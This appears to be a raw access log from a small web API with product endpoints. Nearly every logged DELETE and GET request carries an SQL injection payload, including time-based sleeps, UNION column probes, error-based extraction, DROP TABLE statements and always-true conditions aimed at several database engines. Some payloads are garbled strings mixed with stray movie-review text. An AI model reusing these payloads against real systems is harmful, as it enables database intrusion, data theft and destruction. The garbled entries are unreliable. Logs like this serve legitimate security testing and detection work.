Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - DELETE /produtos/test1%20)%20where%206784%20=%206784%20and%20elt%20(%203114%20=%203114,sleep%20(%205%20)%20)%20 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20union%20all%20select%20null,null,null,null,null,null,null,null,null,null%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20)%20)%20as%20yfpl%20where%204820%20=%204820%20union%20all%20select%20null,null,null,null,null,null,null%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test-8550'+%20(%20select%20ando%20where%201830%20=%201830%20union%20all%20select%201831,1831,1831,8131,8131,8131,8131%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20)%20)%20as%20spil%20where%202483%20=%202438 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20)%20)%20or%20extractvalue%20(%201297,concat%20(%200x5c,0x7171706a71,%20(%20select%20(%20elt%20(%201297%20=%201297,1%20)%20)%20)%20,0x717a767a71%20)%20)%20and%20(%20(%20(%204510%20=%204510 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20or%207427%20=%20dbms_pipe.receive_message%20(%20chr%20(%20116%20)%20%7C%7Cchr%20(%2087%20)%20%7C%7Cchr%20(%2090%20)%20%7C%7Cchr%20(%20109%20)%20,5%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%25%22%20)%20)%20)%20and%206969%20=%20(%20select%206969%20from%20pg_sleep%20(%205%20)%20)%20and%20(%20(%20(%20%22%25%22%20=%20%22 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20where%206304%20=%206304 HTTP/1.1
172.18.0.1 - DELETE /produtos/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22%25@%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - DELETE /produtos/test-4546%22%20)%20)%20union%20all%20select%204136,4136,4136,4136,4136,4136,4136%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test-7864%20or%204493%20=%20utl_inaddr.get_host_address%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%204493%20=%204493%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%201 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20union%20all%20select%20null,null,null,null,null,null,null%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20where%201100%20=%201100%20and%20sleep%20(%205%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20)%20)%20as%20dooi%20where%201806%20=%201806%20and%206414%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20and%20elt%20(%201210%20=%201210,sleep%20(%205%20)%20)%20 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20)%20union%20all%20select%20null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - DELETE /produtos/test-7745'+%20(%20select%20'qqpo'%20where%207049%20=%207049%20or%201570%20=%20convert%20(%20int,%20(%20select%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%201570%20=%201570%20)%20then%20char%20(%2049%20)%20else%20c))))) HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20)%20)%20or%20sleep%20(%205%20)%20and%20(%20(%20(%20'ecur'%20=%20'ecur HTTP/1.1
172.18.0.1 - DELETE /produtos/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22_%7B%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20)%20as%20bpmk%20where%206412%20=%206412%20union%20all%20select%20null,null,null,null HTTP/1.1
172.18.0.1 - DELETE /produtos/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22%20(%20%5B%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20)%20)%20as%20qrrx%20where%204633%20=%204633%20and%209660%20=%20(%20select%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20and%206537%20=%20dbms_pipe.receive_message%20(%20chr%20(%2076%20)%20%7C%7Cchr%20(%20116%20)%20%7C%7Cchr%20(%20117%20)%20%7C%7Cchr%20(%2065%20)%20,5%20) HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%7C%7C%20(%20select%20'vdeo'%20where%204355%20=%204355 HTTP/1.1
172.18.0.1 - DELETE /produtos/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22%20)%20;%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20where%202278%20=%202278%20and%20(%20select%209067%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209067%20=%209067,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_sets%20group%20by%20x%20)%20a%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20)%20as%20clhk%20where%204607%20=%204607%20or%20(%20select%209173%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209173%20=%209173,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_sets%20group%20by%20x%20)%20a%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/testselect%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20and%20(%20(%20(%20'yvbs'%20=%20'yvbs HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20where%207021%20=%207021%20or%206793%20=%20(%20select%206793%20from%20pg_sleep%20(%205%20)%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271+--&categoria=%27+OR+%271%27%3D%271+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271%23&categoria=%27+OR+%271%27%3D%271%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271--Wret+about+a+competit+for+the+first+three+word.+The+show+was+a+piece+of+contraption%2C+but+the+script+was+actually+superb+flas.+However%2C+he+is+so+much+more+ridiculous%2C+pretty+lame+scenes+and+a+good+performance+and+spend+that+he+played+the+actor&categoria=%27+OR+%271%27%3D%271--Wret+about+a+competit+for+the+first+three+word.+The+show+was+a+piece+of+contraption%2C+but+the+script+was+actually+superb+flas.+However%2C+he+is+so+much+more+ridiculous%2C+pretty+lame+scenes+and+a+good+performance+and+spend+that+he+played+the+actor HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271&categoria=%27+OR+%271%27%3D%271 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271%23+--&categoria=%27+OR+%271%27%3D%271%23+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+benchmart+%29+%2C1000%2C1061+%29+and+%27blvb%27+like+%27blbv&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+benchmart+%29+%2C1000%2C1061+%29+and+%27blvb%27+like+%27blbv HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentytel+%29+%27atex%27+%29+%27agivin%27&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentytel+%29+%27atex%27+%29+%27agivin%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+--&categoria=%27+UNION+SELECT+%40+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+table_name%27+%29+%2C%27rabjjbsing+%28+%27GERT+%40%29+or+%28SELECT+0%29%23&categoria=%27+UNION+SELECT+table_name%27+%29+%2C%27rabjjbsing+%28+%27GERT+%40%29+or+%28SELECT+0%29%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmatebempale_sate%2C+%29+UNiON+select+%40%40version+%29+--&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmatebempale_sate%2C+%29+UNiON+select+%40%40version+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%28+--&categoria=%27+UNION+SELECT+%40%28+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+%2C+users%2Cgverpabp_rale%29+and+%27vari%27+like+%27vab1%2C1&categoria=%27+UNION+SELECT+%28+%2C+users%2Cgverpabp_rale%29+and+%27vari%27+like+%27vab1%2C1 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verseoncmane+%28+%27DbO%27%27%2C+%29+%2CVErselect+%28+0X1+%29+%2C0X4c4b40+%29+%29+%26%26+%22%3B%22+noT+lIkE+%22%3BC%22+aND+Tru&categoria=%27+UNION+SELECT+%40+verseoncmane+%28+%27DbO%27%27%2C+%29+%2CVErselect+%28+0X1+%29+%2C0X4c4b40+%29+%29+%26%26+%22%3B%22+noT+lIkE+%22%3BC%22+aND+Tru HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+%2C+users%2Cgverpabp_race_table_and+Fibr_tves_vorit%27+Where+1%2F%2A%2A%2F&categoria=%27+UNION+SELECT+%28+%2C+users%2Cgverpabp_race_table_and+Fibr_tves_vorit%27+Where+1%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+table_name%27+%29+--&categoria=%27+UNION+SELECT+table_name%27+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+%2C+users%2Cgverpabp_race_table_ancibe+versible+be+vas+NO+EDD+%29+%3Ctable+--&categoria=%27+UNION+SELECT+%28+%2C+users%2Cgverpabp_race_table_ancibe+versible+be+vas+NO+EDD+%29+%3Ctable+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27+OR+%279%27%3D%278o1%23%27+OR+0x14E8+NOT+LiKe+%28sELECT+%28selecT+%28sELECt+%28SELECT+2538%29%29%29%29+%26%26+TRue&categoria=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27+OR+%279%27%3D%278o1%23%27+OR+0x14E8+NOT+LiKe+%28sELECT+%28selecT+%28sELECt+%28SELECT+2538%29%29%29%29+%26%26+TRue HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verseoncmane+%29+%3D0b1%2C0x1+aNd+%22V%22+NOT+LIke+%22v%22+and+%222%22+nOT+like+%222%22+or+%22%24%22+Not+liKe+%22+%22+or+%22v%22+not+lIkE+%22V%22&categoria=%27+UNION+SELECT+%40+verseoncmane+%29+%3D0b1%2C0x1+aNd+%22V%22+NOT+LIke+%22v%22+and+%222%22+nOT+like+%222%22+or+%22%24%22+Not+liKe+%22+%22+or+%22v%22+not+lIkE+%22V%22 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C-&categoria=%27+UNION+SELECT+%40+%2C- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+_%28+%2Cull%2Cfuln%3Bname%29%3Bfromtibletabsetamesaket%27%29&categoria=%27+UNION+SELECT+_%28+%2Cull%2Cfuln%3Bname%29%3Bfromtibletabsetamesaket%27%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+converse+%29+not+tebe+nems%27+--&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+converse+%29+not+tebe+nems%27+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+-+Table_name%27+%29+%2CCORUTT+%29+%2C+LAVE_THER+FROM+tUSE---+1&categoria=%27+UNION+SELECT+-+Table_name%27+%29+%2CCORUTT+%29+%2C+LAVE_THER+FROM+tUSE---+1 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28char%3B%29%3B+allet%2F%2A%2A%2F&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28char%3B%29%3B+allet%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28char.%29+%2C+as+trectallyurederiban_hev__Nove_&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28char.%29+%2C+as+trectallyurederiban_hev__Nove_ HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+%2C+usersion%2C+%28+select+%40%40version%2C+select+%29+enve%2F%2A%2A%2F&categoria=%27+UNION+SELECT+%28+%2C+usersion%2C+%28+select+%40%40version%2C+select+%29+enve%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cwame_terselemp&categoria=%27+UNION+SELECT+%40+%2C+users%2Cwame_terselemp HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+--&categoria=%27%3B+DROP+TABLE+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+%28+--&categoria=%27%3B+DROP+TABLE+%28+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SEM&categoria=%27%3B+DROP+TABLE+SEM HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SE&categoria=%27%3B+DROP+TABLE+SE HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SEMAN%27+exercovers+igengamer+bery+warnareded+in+an+extremely+favorite+film.+The+plot+is+very+disappointing+and+family.+This+is+a+truly+typical+film+that+would+have+favorited+writing+and+producer.+I+have+never+read+allowent+a&categoria=%27%3B+DROP+TABLE+SEMAN%27+exercovers+igengamer+bery+warnareded+in+an+extremely+favorite+film.+The+plot+is+very+disappointing+and+family.+This+is+a+truly+typical+film+that+would+have+favorited+writing+and+producer.+I+have+never+read+allowent+a HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+S&categoria=%27%3B+DROP+TABLE+S HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+1+--&categoria=%27%3B+DROP+TABLE+1+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%22+OR+%221%22%3D%221%22+--&categoria=%22+OR+%221%22%3D%221%22+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%22+OR+%221%22%3D%221+--&categoria=%22+OR+%221%22%3D%221+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+%29+%29+or+8315+%3D+%28+select+count+%28+%2A+%29+from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3+%29+and+%28+%28+%28+9802+%3D+9802&categoria=1+%29+%29+%29+or+8315+%3D+%28+select+count+%28+%2A+%29+from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3+%29+and+%28+%28+%28+9802+%3D+9802 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+%29+as+tgjp+where+5946+%3D+5946&categoria=1%22+%29+%29+as+tgjp+where+5946+%3D+5946 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+where+6494+%3D+6494&categoria=1+%29+where+6494+%3D+6494 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-3737%25%22+union+all+select+4452%2C4452%2C4452%23&categoria=-3737%25%22+union+all+select+4452%2C4452%2C4452%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=0x0X0o15%27+%29+%3B+OR+cHar+%28+0x0b0o0X6X9X0x4a+%29+Or+CHAr+%28+0x5O112+%29+oR+Char+%27%28+%28SElEcT+%28SELECT+%28sElect+%28SeLECT+%28sElect+0X0X0X0x6d%29%29%29%29%29+%29+or+chaR+%28+0X0o1o0o0o7x0X0X0B1010101+%29+%3DREGExP_suBsTrIng+%28+rePEAT+%28+rIGhT+%28+Char+%28+%28SelEct%29%29%29%29&categoria=0x0X0o15%27+%29+%3B+OR+cHar+%28+0x0b0o0X6X9X0x4a+%29+Or+CHAr+%28+0x5O112+%29+oR+Char+%27%28+%28SElEcT+%28SELECT+%28sElect+%28SeLECT+%28sElect+0X0X0X0x6d%29%29%29%29%29+%29+or+chaR+%28+0X0o1o0o0o7x0X0X0B1010101+%29+%3DREGExP_suBsTrIng+%28+rePEAT+%28+rIGhT+%28+Char+%28+%28SelEct%29%29%29%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+as+deqp+where+5140+%3D+5140&categoria=1+%29+as+deqp+where+5140+%3D+5140 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%2B+%28+select+%27qzcx%27+where+9524+%3D+9524+and+elt+%28+3069+%3D+8430%2C8430+%29+%29+%2B%27&categoria=1%27%2B+%28+select+%27qzcx%27+where+9524+%3D+9524+and+elt+%28+3069+%3D+8430%2C8430+%29+%29+%2B%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+%29+or+4411+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+and+%28+%28+%28+%27gmvk%27+like+%27gmvk&categoria=1%27+%29+%29+%29+or+4411+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+and+%28+%28+%28+%27gmvk%27+like+%27gmvk HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=0b0O0B1%27+%29+OR+CHAR+%28+%28sELeCt+%28SEleCT+%28selECt+%28seLeCT+%28SELECT+%28SELECT+88%29%29%29%29%29%29%3B+%29+OR+char+%28+%28sELECT+0x7d%29+%29+or+chAr+%28+%28sELeCt+%28sElect+0x0x9e%29%29+%29+lIKe+rEgexp_SUbSTrIng+%28+repEaT+%28+rIGHt+%28+char+%28+%28sEleCT+%28seLecT+%28SeLecT+2540%29%29%29%29%29%29&categoria=0b0O0B1%27+%29+OR+CHAR+%28+%28sELeCt+%28SEleCT+%28selECt+%28seLeCT+%28SELECT+%28SELECT+88%29%29%29%29%29%29%3B+%29+OR+char+%28+%28sELECT+0x7d%29+%29+or+chAr+%28+%28sELeCt+%28sElect+0x0x9e%29%29+%29+lIKe+rEgexp_SUbSTrIng+%28+repEaT+%28+rIGHt+%28+char+%28+%28sEleCT+%28seLecT+%28SeLecT+2540%29%29%29%29%29%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-4447+union+all+select+4519%2C4519%2C4519%2C4519%2C4519+--&categoria=-4447+union+all+select+4519%2C4519%2C4519%2C4519%2C4519+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+or+8466+%3D+benchmark+%28+5000000%2Cmd5+%28+0x694a4745+%29+%29+and+%28+%28+%27jfwt%27+like+%27jfwt&categoria=1%27+%29+%29+or+8466+%3D+benchmark+%28+5000000%2Cmd5+%28+0x694a4745+%29+%29+and+%28+%28+%27jfwt%27+like+%27jfwt HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-8021%22+%29+union+all+select+1166%2C1166%2C1166%2C1166+--&categoria=-8021%22+%29+union+all+select+1166%2C1166%2C1166%2C1166+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+as+pogx+where+4105+%3D+4105+and+2853+%3D+cast+%28+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%29+%7C%7C+%28+select+%28+case+when+%28+2853+%3D+2853+%29+then+1+else+0+end+%29+%29+%3A%3Atext%7C%7C+%28&categoria=1%27+%29+as+pogx+where+4105+%3D+4105+and+2853+%3D+cast+%28+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%29+%7C%7C+%28+select+%28+case+when+%28+2853+%3D+2853+%29+then+1+else+0+end+%29+%29+%3A%3Atext%7C%7C+%28 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+%29+and+3824+%3D+benchmark+%28+5000000%2Cmd5+%28+0x76555642+%29+%29+and+%28+%28+%28+%27subq%27+like+%27subq&categoria=1%27+%29+%29+%29+and+3824+%3D+benchmark+%28+5000000%2Cmd5+%28+0x76555642+%29+%29+and+%28+%28+%28+%27subq%27+like+%27subq HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+%29+or+6793+%3D+%28+select+6793+from+pg_sleep+%28+5+%29+%29+and+%28+%28+3069+%3D+3069&categoria=1+%29+%29+or+6793+%3D+%28+select+6793+from+pg_sleep+%28+5+%29+%29+and+%28+%28+3069+%3D+3069 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%7C%7C+%28+select+%27vqag%27+from+dual+where+8154+%3D+8154+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+--&categoria=1%27%7C%7C+%28+select+%27vqag%27+from+dual+where+8154+%3D+8154+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+as+fbuh+where+6821+%3D+6821+or+6793+%3D+%28+select+6793+from+pg_sleep+%28+5+%29+%29+--&categoria=1%27+%29+as+fbuh+where+6821+%3D+6821+or+6793+%3D+%28+select+6793+from+pg_sleep+%28+5+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+as+cwss+where+9720+%3D+9720&categoria=1%27+%29+%29+as+cwss+where+9720+%3D+9720 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+where+6956+%3D+6956+or+8315+%3D+%28+select+count+%28+%2A+%29+from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3+%29+--&categoria=1%22+%29+where+6956+%3D+6956+or+8315+%3D+%28+select+count+%28+%2A+%29+from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+where+1100+%3D+1100+and+sleep+%28+5+%29+--&categoria=1+%29+where+1100+%3D+1100+and+sleep+%28+5+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=select+%2A+from+users+where+id+%3D+1+or+%22.%40%22+or+1+%3D+1+--+1&categoria=select+%2A+from+users+where+id+%3D+1+or+%22.%40%22+or+1+%3D+1+--+1 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+as+kgiw+where+7452+%3D+7452+and+6510+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+--&categoria=1%27+%29+%29+as+kgiw+where+7452+%3D+7452+and+6510+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+%29+as+fixr+where+2934+%3D+2934+or+9324+%3D+9324&categoria=1+%29+%29+as+fixr+where+2934+%3D+2934+or+9324+%3D+9324 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+%29+%29+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+fzno+%29+and+%28+%28+%28+%22jenb%22+like+%22jenb&categoria=1%22+%29+%29+%29+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+fzno+%29+and+%28+%28+%28+%22jenb%22+like+%22jenb HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+%29+as+qgyz+where+1547+%3D+1647+and+make_set+%28+8403+%3D+8403%2C8899+%29+--&categoria=1%22+%29+%29+as+qgyz+where+1547+%3D+1647+and+make_set+%28+8403+%3D+8403%2C8899+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+%29+and+exp+%28+~+%28+select+%2A+from+%28+select+concat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+8190+%3D+8190%2C1+%29+%29+%29+%2C0x717a767a71%2C0x78+%29+%29+x+%29+%29+and+%28+%28+%28+%27txwf%27+%3D+%27txwf+--&categoria=1%27+%29+%29+%29+and+exp+%28+~+%28+select+%2A+from+%28+select+concat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+8190+%3D+8190%2C1+%29+%29+%29+%2C0x717a767a71%2C0x78+%29+%29+x+%29+%29+and+%28+%28+%28+%27txwf%27+%3D+%27txwf+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+as+vcop+where+5886+%3D+5886+or+5356+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+--&categoria=1%27+%29+as+vcop+where+5886+%3D+5886+or+5356+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+srmq+%29+and+%28+%28+%22hxdd%22+%3D+%22hxdd&categoria=%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+srmq+%29+and+%28+%28+%22hxdd%22+%3D+%22hxdd HTTP/1.1
